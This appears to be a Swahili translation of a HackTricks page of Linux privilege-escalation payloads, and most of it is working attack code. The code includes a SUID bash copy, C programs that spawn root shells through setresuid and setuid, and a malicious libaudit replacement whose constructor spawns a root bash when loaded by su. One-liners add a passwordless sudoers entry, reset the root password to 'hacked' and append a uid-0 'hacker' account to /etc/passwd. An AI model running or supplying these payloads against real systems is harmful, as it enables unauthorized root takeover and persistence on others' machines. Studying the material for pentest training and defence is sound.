# Payloads za kutekeleza

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` huwezesha hali ya upendeleo: Bash inapoanza ikiwa na vitambulisho halisi na vya ufanisi tofauti, haiweki upya kitambulisho cha ufanisi kuwa cha kitambulisho halisi. Shell inayotokana bado hutegemea credentials zilizopo za caller.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` hubadilisha vitambulisho halisi, vya ufanisi, na vilivyohifadhiwa inapokuwa imeruhusiwa, huku `setuid` ikibadilisha kitambulisho cha ufanisi na pia inaweza kuweka vitambulisho halisi na vilivyohifadhiwa kwa caller mwenye privileges. `execve` hubadilisha picha ya mchakato wa sasa na program iliyoombwa.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Mifano hii haijumuishi ukaguzi wa thamani ya marejesho; miito yote miwili ya credentials inaweza kushindwa hata kwa UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Kuandika upya faili ili kuongeza privileges

### Faili za kawaida

Hizi ni faili na interfaces za kawaida za kudhibiti local privileges: `/etc/passwd` huhifadhi rekodi za akaunti zenye fields saba, `/etc/shadow` huhifadhi data ya password iliyosimbwa kwa njia ya hiari, `sudoers` hufafanua sudo privileges na tags kama vile `NOPASSWD`, na default daemon endpoint ya Docker ni Unix socket katika `/var/run/docker.sock`; access kwa socket hiyo inaweza kutoa control ya kiwango cha root kwenye host yake.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Ongeza user mwenye password kwenye _/etc/passwd_
- Badilisha password ndani ya _/etc/shadow_
- Ongeza user kwenye sudoers katika _/etc/sudoers_
- Tumia vibaya Docker kupitia docker socket, kwa kawaida katika _/run/docker.sock_ au _/var/run/docker.sock_

### Kuandika upya library

Kagua shared libraries zinazotumiwa na binary; katika mfano huu, kagua `/bin/su` kwa kutumia `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` huripoti dependencies za shared-object, huku dynamic linker ikitumia metadata ya ELF na kanuni zake za utafutaji kuzipakia wakati wa runtime.<sup>[[9]](#references)[[10]](#references)</sup>

Ili kukagua candidate mmoja, tumia `objdump -T` kuchapisha dynamic symbol table ya `su` na kuchuja kwa majina ya audit.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message`, na `audit_log_acct_message` ni functions za libaudit; `audit_fd` imeonyeshwa kama data object iliyofafanuliwa katika `.bss` ya `su` kwenye output hii.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Replacement library lazima i-export definitions zinazoendana kwa undefined symbols ambazo loader huzitatua; kutolingana kwa function/data ABIs bado kunaweza kufanya process ishindwe wakati symbols hizo zinaporelocatewa au kuitwa.<sup>[[10]](#references)[[11]](#references)</sup>

GCC's `constructor` attribute husababisha `inject` kuitwa automatically kabla ya `main` kwenye targets zinazoungwa mkono.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Ikiwa replacement itapakiwa kwa mafanikio na mchakato wa privileged **`/bin/su`**, constructor hii inaweza kuanzisha **`/bin/bash`** kwa privileges za mchakato huo; matokeo kamili hutegemea mazingira.<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

Je, unaweza kufanya root atekeleze kitu?

`sudoers` hutumia tag ya `NOPASSWD` katika entries za policy, `chpasswd` husoma jozi za `user:password` kutoka standard input, na `/etc/passwd` hutumia fields saba za akaunti zilizotenganishwa kwa colon; mifano ifuatayo inachukulia kuwa files zinazohusika zinaweza kuandikwa na mchakato unaozitekeleza.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data hadi sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Badilisha nenosiri la root**
```bash
echo "root:hacked" | chpasswd
```
### Ongeza mtumiaji mpya wa root kwenye /etc/passwd

payload ya mwisho inategemea target inayokubali `crypt` hash iliyozalishwa: `mkpasswd -m sha-512` ya Debian hutumia SHA-512 crypt (`$6$`), huku `passwd -1 -salt` ya OpenSSL ikitumia algorithm ya BSD inayotegemea MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [The Set Builtin (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Kurasa za Man za Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Linda socket ya daemon ya Docker](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Nyaraka za Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Kurasa za Man za Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Kurasa za Man za Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Kurasa za Man za Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Sifa za Kawaida (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Vyanzo vya Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — Nyaraka za OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
